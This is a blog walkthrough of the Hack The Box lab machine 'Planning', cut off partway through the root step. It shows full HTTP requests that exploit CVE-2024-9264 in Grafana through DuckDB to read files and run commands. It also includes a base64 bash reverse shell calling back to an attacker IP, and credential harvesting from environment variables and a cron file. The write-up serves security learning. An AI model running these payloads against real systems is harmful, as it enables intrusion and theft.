---
layout: post
title: Hack The Box Walkthrough - Planning
date: 2025-08-30
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2025/08/HTB/Planning
img: 2025/08/Planning/Planning.png
---

In this box, I had to exploit a known vulnerability in Grafana to get a shell, find some credentials to get a user connection. And finally exploit an application to manage cron jobs to get root.

* Room: Planning
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Planning](https://app.hackthebox.com/machines/Planning)
* Authors: 
    * [d00msl4y3r](https://app.hackthebox.com/users/128944)
    * [FisMatHack](https://app.hackthebox.com/users/1076236)

This box provided some credentials to start with.

```
As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r
```

## Enumeration

I started the machine by running `rustscan` to check for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.3.143:22
Open 10.129.3.143:80
^[[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 14:35 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.

...

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/27%OT=22%CT=%CU=33179%PV=Y%DS=2%DC=T%G=N%TM=68867174
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%TS=A)OPS(O1=M5
OS:77ST11NW7%O2=M577ST11NW7%O3=M577NNT11NW7%O4=M577ST11NW7%O5=M577ST11NW7%O
OS:6=M577ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%D
OS:F=Y%T=40%W=FAF0%O=M577NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 4.101 days (since Wed Jul 23 12:10:46 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   147.28 ms 10.10.14.1
2   147.46 ms target (10.129.3.143)

...

Nmap done: 1 IP address (1 host up) scanned in 9.81 seconds
           Raw packets sent: 38 (2.458KB) | Rcvd: 31 (7.590KB)
```

The box had two open ports: 22 (SSH) and 80 (HTTP). The site on port 80 was redirecting to `planning.htb`. I added that domain to my hosts file.

I scanned for UDP ports. It did not find anything. I checked for subdomains of `planning.htb`.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 12 -H "Host:FUZZ.planning.htb" "http://planning.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://planning.htb/
Total requests: 653920

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000212052:   302        0 L      0 W        0 Ch        "grafana"

Total time: 912.6123
Processed Requests: 653920
Filtered Requests: 653919
Requests/sec.: 716.5363
```

It found one.

## Website

I opened a browser and looked at the website on port 80.

![Website](/assets/images/2025/08/Planning/Website.png "Website")

The website was for an online education platform. There were a few forms on the different pages, but they did not appear to do much. The search form never returned anything. And the contact form was not submitting anything. The enrollment form looked interesting, but I kept looking around.

I used Feroxbuster to check for any hidden pages.

```bash
$ feroxbuster -u http://planning.htb/ -xphp -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://planning.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://planning.htb/js => http://planning.htb/js/
301      GET        7l       12w      178c http://planning.htb/css => http://planning.htb/css/
200      GET      201l      663w    10632c http://planning.htb/contact.php
200      GET        5l       89w     5527c http://planning.htb/img/testimonial-2.jpg
200      GET      230l      874w    12727c http://planning.htb/about.php
200      GET        1l       38w     2303c http://planning.htb/lib/easing/easing.min.js
200      GET      137l      234w     3338c http://planning.htb/js/main.js
200      GET       21l      212w    20494c http://planning.htb/img/team-3.jpg
200      GET        7l      158w     9028c http://planning.htb/lib/waypoints/waypoints.min.js
200      GET       11l       56w     2406c http://planning.htb/lib/counterup/counterup.min.js
200      GET        6l       64w     2936c http://planning.htb/lib/owlcarousel/assets/owl.carousel.min.css
200      GET      220l      880w    13006c http://planning.htb/detail.php
200      GET        8l       58w     5269c http://planning.htb/img/testimonial-1.jpg
200      GET      194l      674w    10229c http://planning.htb/course.php
200      GET      420l     1623w    23914c http://planning.htb/index.php
200      GET      173l      851w    64663c http://planning.htb/img/courses-1.jpg
200      GET       60l      404w    29126c http://planning.htb/img/team-2.jpg
200      GET      128l      607w    48746c http://planning.htb/img/courses-2.jpg
301      GET        7l       12w      178c http://planning.htb/img => http://planning.htb/img/
200      GET      136l      656w    53333c http://planning.htb/img/courses-3.jpg
200      GET       63l      389w    30916c http://planning.htb/img/team-1.jpg
200      GET        7l      279w    42766c http://planning.htb/lib/owlcarousel/owl.carousel.min.js
200      GET      146l      790w    75209c http://planning.htb/img/feature.jpg
200      GET      103l      772w    55609c http://planning.htb/img/about.jpg
301      GET        7l       12w      178c http://planning.htb/lib => http://planning.htb/lib/
200      GET     9966l    19218w   183895c http://planning.htb/css/style.css
200      GET      420l     1623w    23914c http://planning.htb/
403      GET        7l       10w      162c http://planning.htb/lib/owlcarousel/assets/
403      GET        7l       10w      162c http://planning.htb/lib/
403      GET        7l       10w      162c http://planning.htb/lib/waypoints/
403      GET        7l       10w      162c http://planning.htb/lib/easing/
403      GET        7l       10w      162c http://planning.htb/lib/counterup/
403      GET        7l       10w      162c http://planning.htb/img/
403      GET        7l       10w      162c http://planning.htb/lib/owlcarousel/
200      GET       23l      172w     1090c http://planning.htb/lib/owlcarousel/LICENSE
301      GET        7l       12w      178c http://planning.htb/lib/owlcarousel/assets => http://planning.htb/lib/owlcarousel/assets/
200      GET        0l        0w        0c http://planning.htb/lib/waypoints/links.php
403      GET        7l       10w      162c http://planning.htb/js/
403      GET        7l       10w      162c http://planning.htb/css/
200      GET      156l      543w     7053c http://planning.htb/enroll.php
200      GET      432l     2255w   160279c http://planning.htb/img/header.jpg
[################>---] - 2m    956926/1196044 27s     found:41      errors:0
[####################] - 5m   1196044/1196044 0s      found:41      errors:0
[####################] - 5m    119601/119601  426/s   http://planning.htb/
[####################] - 5m    119601/119601  426/s   http://planning.htb/js/
[####################] - 5m    119601/119601  426/s   http://planning.htb/css/
[####################] - 5m    119601/119601  427/s   http://planning.htb/lib/owlcarousel/assets/
[####################] - 5m    119601/119601  426/s   http://planning.htb/lib/waypoints/
[####################] - 5m    119601/119601  426/s   http://planning.htb/lib/counterup/
[####################] - 5m    119601/119601  425/s   http://planning.htb/lib/
[####################] - 5m    119601/119601  426/s   http://planning.htb/img/
[####################] - 5m    119601/119601  426/s   http://planning.htb/lib/easing/
[####################] - 5m    119601/119601  426/s   http://planning.htb/lib/owlcarousel/
```

It didn't find anything interesting.

## Grafana

The subdomains scan found `grafana.planning.htb`. I added it to my hosts file and navigated to it.

![Grafana](/assets/images/2025/08/Planning/GrafanaLogin.png "Grafana")

It was an instance of [Grafana](https://grafana.com/) v11.0.0. The credentials provided with the box allowed me to connect as an admin.

I looked and quickly found that there were [multiple vulnerabilities](https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/) in the installed version of Grafana. It was possible to get RCE by using DuckDB queries.

I found a [POC](https://github.com/nollium/CVE-2024-9264) to exploit the vulnerabilities and gave it a try.

```bash
$ uv run CVE-2024-9264.py --user admin --password 0D5oT70Fq13EvB5r --file /etc/passwd http://grafana.planning.htb/                                      
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/passwd
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/etc/passwd'):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```

It worked. This confirmed that the DuckDB binary was present and I could exploit the vulnerabilities. Next, I tried to exploit it manually.

I first tried to read `/etc/passwd`.

```http
POST /api/ds/query?ds_type=__expr__&expression=true&requestId=Q101 HTTP/1.1
Host: grafana.planning.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://grafana.planning.htb/dashboard/new?orgId=1
content-type: application/json
x-datasource-uid: grafana
x-grafana-device-id: 8bedf809f5e59259ca40bcd6f27fd226
x-grafana-org-id: 1
x-panel-id: 1
x-panel-plugin-id: timeseries
x-plugin-id: datasource
Content-Length: 204
Origin: http://grafana.planning.htb
Connection: keep-alive
Cookie: grafana_session=7e03db75db0537b011d4b9897678b38b; grafana_session_expiry=1753557754
Priority: u=4

{
  "queries": [
    {
      "refId": "B",
      "datasource": {
        "type": "__expr__",
        "uid": "__expr__",
        "name": "Expression"
      },
      "type": "sql",
      "hide": false,
      "expression": "SELECT content FROM read_blob(\"/etc/passwd\")",
      "window": ""
    }
  ],
  "from": "1729313027261",
  "to": "1729334627261"
}
```

It worked. 

```http
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 26 Jul 2025 19:18:43 GMT
Content-Type: application/json
Content-Length: 1248
Connection: keep-alive
Cache-Control: no-store
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block

{
    "results": {
        "B": {
            "status": 200,
            "frames": [{
                "schema": {
                    "name": "B",
                    "refId": "B",
                    "fields": [{
                        "name": "content",
                        "type": "string",
                        "typeInfo": {
                            "frame": "string",
                            "nullable": true
                        }
                    }]
                },
                "data": {
                    "values": [
                        ["root:x:0:0:root:/root:/bin/bash\\x0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\x0Abin:x:2:2:bin:/bin:/usr/sbin/nologin\\x0Asys:x:3:3:sys:/dev:/usr/sbin/nologin\\x0Async:x:4:65534:sync:/bin:/bin/sync\\x0Agames:x:5:60:games:/usr/games:/usr/sbin/nologin\\x0Aman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\x0Alp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\x0Amail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\x0Anews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\x0Auucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\x0Aproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\x0Awww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\x0Abackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\x0Alist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\x0Airc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\x0Agnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\x0Anobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\x0A_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\x0Agrafana:x:472:0::/home/grafana:/usr/sbin/nologin\\x0A"]
                    ]
                }
            }]
        }
    }
}
```

I next tried to use it to get code execution. RCE was obtained in two steps. I first had to use `read_csv` to run a command and output the results in a PHP file.

```http
POST /api/ds/query?ds_type=__expr__&expression=true&requestId=Q101 HTTP/1.1
Host: grafana.planning.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://grafana.planning.htb/dashboard/new?orgId=1
content-type: application/json
x-datasource-uid: grafana
x-grafana-device-id: 8bedf809f5e59259ca40bcd6f27fd226
x-grafana-org-id: 1
x-panel-id: 1
x-panel-plugin-id: timeseries
x-plugin-id: datasource
Content-Length: 204
Origin: http://grafana.planning.htb
Connection: keep-alive
Cookie: grafana_session=7e03db75db0537b011d4b9897678b38b; grafana_session_expiry=1753557754
Priority: u=4

{
  "queries": [
    {
      "refId": "B",
      "datasource": {
        "type": "__expr__",
        "uid": "__expr__",
        "name": "Expression"
      },
      "type": "sql",
      "hide": false,
      "expression": "SELECT 1; install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('id >/tmp/test 2>&1 |')",
      "window": ""
    }
  ],
  "from": "1729313027261",
  "to": "1729334627261"
}
```

This did not return anything meaningful. To view the results of the command, I had to use `read_blob` to read the file where the output was redirected.

```bash
POST /api/ds/query?ds_type=__expr__&expression=true&requestId=Q101 HTTP/1.1
Host: grafana.planning.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://grafana.planning.htb/dashboard/new?orgId=1
content-type: application/json
x-datasource-uid: grafana
x-grafana-device-id: 8bedf809f5e59259ca40bcd6f27fd226
x-grafana-org-id: 1
x-panel-id: 1
x-panel-plugin-id: timeseries
x-plugin-id: datasource
Content-Length: 204
Origin: http://grafana.planning.htb
Connection: keep-alive
Cookie: grafana_session=7e03db75db0537b011d4b9897678b38b; grafana_session_expiry=1753557754
Priority: u=4

{
  "queries": [
    {
      "refId": "B",
      "datasource": {
        "type": "__expr__",
        "uid": "__expr__",
        "name": "Expression"
      },
      "type": "sql",
      "hide": false,
      "expression": "SELECT content FROM read_blob(\"/tmp/test\")",
      "window": ""
    }
  ],
  "from": "1729313027261",
  "to": "1729334627261"
}
```

This showed that the application was running as root.

```bash
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 26 Jul 2025 19:23:50 GMT
Content-Type: application/json
Content-Length: 240
Connection: keep-alive
Cache-Control: no-store
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block

{
    "results": {
        "B": {
            "status": 200,
            "frames": [{
                "schema": {
                    "name": "B",
                    "refId": "B",
                    "fields": [{
                        "name": "content",
                        "type": "string",
                        "typeInfo": {
                            "frame": "string",
                            "nullable": true
                        }
                    }]
                },
                "data": {
                    "values": [
                        ["uid=0(root) gid=0(root) groups=0(root)\\x0A"]
                    ]
                }
            }]
        }
    }
}
```

With RCE confirmed, I created a base64 reverse shell.

```bash
$ echo 'bash -c "bash  -i >& /dev/tcp/10.10.14.105/4444 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA1LzQ0NDQgMD4mMSIK
```

And I executed it on the server.

```bash
POST /api/ds/query?ds_type=__expr__&expression=true&requestId=Q101 HTTP/1.1
Host: grafana.planning.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://grafana.planning.htb/dashboard/new?orgId=1
content-type: application/json
x-datasource-uid: grafana
x-grafana-device-id: 8bedf809f5e59259ca40bcd6f27fd226
x-grafana-org-id: 1
x-panel-id: 1
x-panel-plugin-id: timeseries
x-plugin-id: datasource
Content-Length: 204
Origin: http://grafana.planning.htb
Connection: keep-alive
Cookie: grafana_session=7e03db75db0537b011d4b9897678b38b; grafana_session_expiry=1753557754
Priority: u=4

{
  "queries": [
    {
      "refId": "B",
      "datasource": {
        "type": "__expr__",
        "uid": "__expr__",
        "name": "Expression"
      },
      "type": "sql",
      "hide": false,
      "expression": "SELECT 1; install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('echo YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA1LzQ0NDQgMD4mMSIK | base64 -d | bash >/tmp/test 2>&1 |')",
      "window": ""
    }
  ],
  "from": "1729313027261",
  "to": "1729334627261"
}
```

It gave me a shell as root in a Docker container.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.105] from (UNKNOWN) [10.129.3.143] 43022
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

root@7ce659d667d7:~# ls -la
ls -la
total 64
drwxr-xr-x  1 root    root  4096 Mar  1 18:01 .
drwxr-xr-x  1 root    root  4096 May 14  2024 ..
drwxrwxrwx  2 grafana root  4096 May 14  2024 .aws
drwxr-xr-x  3 root    root  4096 Mar  1 18:01 .duckdb
-rw-r--r--  1 root    root 34523 May 14  2024 LICENSE
drwxr-xr-x  2 root    root  4096 May 14  2024 bin
drwxr-xr-x  3 root    root  4096 May 14  2024 conf
drwxr-xr-x 16 root    root  4096 May 14  2024 public

root@7ce659d667d7:~# ls -la /
ls -la /
total 60
drwxr-xr-x   1 root root 4096 Apr  4 10:23 .
drwxr-xr-x   1 root root 4096 Apr  4 10:23 ..
-rwxr-xr-x   1 root root    0 Apr  4 10:23 .dockerenv
lrwxrwxrwx   1 root root    7 Apr 27  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 18  2022 boot
drwxr-xr-x   5 root root  340 Jul 26 18:32 dev
drwxr-xr-x   1 root root 4096 Apr  4 10:23 etc
drwxr-xr-x   1 root root 4096 May 14  2024 home
lrwxrwxrwx   1 root root    7 Apr 27  2024 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Apr 27  2024 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Apr 27  2024 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Apr 27  2024 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Apr 27  2024 media
drwxr-xr-x   2 root root 4096 Apr 27  2024 mnt
drwxr-xr-x   2 root root 4096 Apr 27  2024 opt
dr-xr-xr-x 298 root root    0 Jul 26 18:32 proc
drwx------   1 root root 4096 Apr  4 12:43 root
drwxr-xr-x   5 root root 4096 Apr 27  2024 run
-rwxr-xr-x   1 root root 3306 May 14  2024 run.sh
lrwxrwxrwx   1 root root    8 Apr 27  2024 sbin -> usr/sbin
...
```

## User enzo

I looked around the container for ways to escape it. There was a `run.sh` file at the root of the container. It did not contain anything interesting, but it seems to rely on some environment variables. I looked at the variables in the container.

```bash
root@7ce659d667d7:/# env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
TERM=xterm
AWS_AUTH_EXTERNAL_ID=
SHLVL=4
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=REDACTED
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
OLDPWD=/usr/share/grafana
```

I found a set of credentials. I tried to SSH to the server using them.


```bash
$ ssh enzo@target
enzo@target's password:
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jul 26 07:51:56 PM UTC 2025

  System load:  0.1               Processes:             236
  Usage of /:   73.1% of 6.30GB   Users logged in:       0
  Memory usage: 43%               IPv4 address for eth0: 10.129.3.143
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

...

enzo@planning:~$ ls -la
total 32
drwxr-x--- 4 enzo enzo 4096 Apr  3 13:49 .
drwxr-xr-x 3 root root 4096 Feb 28 16:22 ..
lrwxrwxrwx 1 root root    9 Feb 28 20:42 .bash_history -> /dev/null
-rw-r--r-- 1 enzo enzo  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 enzo enzo 3771 Mar 31  2024 .bashrc
drwx------ 2 enzo enzo 4096 Apr  3 13:49 .cache
-rw-r--r-- 1 enzo enzo  807 Mar 31  2024 .profile
drwx------ 2 enzo enzo 4096 Feb 28 16:22 .ssh
-rw-r----- 1 root enzo   33 Jul 26 18:33 user.txt

enzo@planning:~$ cat user.txt
dad4ff1daac3e37e14afb15642dedeea
```

It worked, and I got the user flag.

## Getting root

Once connected, I looked for the habitual low-hanging fruits.

```bash
enzo@planning:~$ sudo -l
[sudo] password for enzo:
Sorry, user enzo may not run sudo on planning.

enzo@planning:~$ find / -perm /u=s 2>/dev/null
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/gpasswd

enzo@planning:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

There was nothing I could abuse. I looked around the server.

```bash
enzo@planning:~$ ls /opt/
containerd  crontabs

enzo@planning:~$ ls /opt/containerd/
ls: cannot open directory '/opt/containerd/': Permission denied

enzo@planning:~$ ls -la /opt/crontabs/
total 12
drwxr-xr-x 2 root root 4096 Jul 26 18:32 .
drwxr-xr-x 4 root root 4096 Feb 28 19:21 ..
-rw-r--r-- 1 root root  737 Jul 26 19:56 crontab.db
```

There was a folder containing crons saved as json. This looked interesting, but I could not edit the file, or add new files in the folder.

```bash
enzo@planning:~$ cat /opt/crontabs/crontab.db | jq .
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}
```

The json contained a password. I tried to `su` as root. It didn't work.

I looked at the open ports and saw that port 8000 was open locally.

```bash
enzo@planning:~$ ss -tunl
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                   Process
udp                     UNCONN                   0                        0                                             127.0.0.54:53                                             0.0.0.0:*
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                             0.0.0.0:*
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                             0.0.0.0:*
tcp                     LISTEN                   0                        511                                            127.0.0.1:8000                                           0.0.0.0:*
tcp                     LISTEN                   0                        4096                                           127.0.0.1:3000                                           0.0.0.0:*
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                             0.0.0.0:*
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                             0.0.0.0:*
tcp                     LISTEN                   0                        70                                             127.0.0.1:33060                                          0.0.0.0:*
tcp                     LISTEN                   0                        4096                                          127.0.0.54:53                                             0.0.0.0:*
tcp                     LISTEN                   0                        4096                                           127.0.0.1:44205                                          0.0.0.0:*
tcp                     LISTEN                   0                        151                                            127.0.0.1:3306                                           0.0.0.0:*
tcp                     LISTEN                   0                        4096                                                   *:22                                                   *:*
```

I created an SSH tunnel to be able to access the port from my machine.

```bash
$ ssh -L 8000:localhost:8000 enzo@target
enzo@target's password:
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jul 26 08:23:08 PM UTC 2025

  System load:  0.43              Processes:             252
  Usage of /:   73.3% of 6.30GB   Users logged in:       1
  Memory usage: 48%               IPv4 address for eth0: 10.129.3.143
  Swap usage:   8%


...
```

I opened the site in my browser and got asked for credentials. I used the passwords that I had found with a few usernames. The password in the json worked for root.

